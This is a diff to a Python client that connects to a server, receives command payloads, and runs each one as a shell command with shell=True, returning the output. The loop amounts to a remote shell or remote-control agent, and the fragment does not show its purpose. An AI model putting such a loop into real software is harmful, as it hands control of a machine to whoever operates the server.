@@ -15,10 +15,13 @@ def create_socket():
     secure_socket.connect()
     while True:
         # Receive data from the server
-        data = secure_socket.receive(parse_payload_to_output)
-        command = data.command
+        payload = secure_socket.receive(parse_payload_to_output)
+        if type(payload) is not CommandPayload:
+            continue
+        command = payload.command
         print('Received:'.center(40, "="))
         print(command)
+
 
         # Generate command
         stdout, stderr = run_command(command)
@@ -34,10 +37,10 @@ def create_socket():
 # Run a line of shell command and returns the result
 # Todo: Keep one subprocess alive
 def run_command(cmd):
-    call = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    result = str(call.stdout.decode("utf-8")), str(call.stderr.decode("utf-8"))
+    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+    result = str(proc.stdout.read().decode("utf-8")), str(proc.stderr.read().decode("utf-8"))
     print(result)
-    return str(call.stdout.decode("utf-8")), str(call.stderr.decode("utf-8"))
+    return result
 
 
 def main():
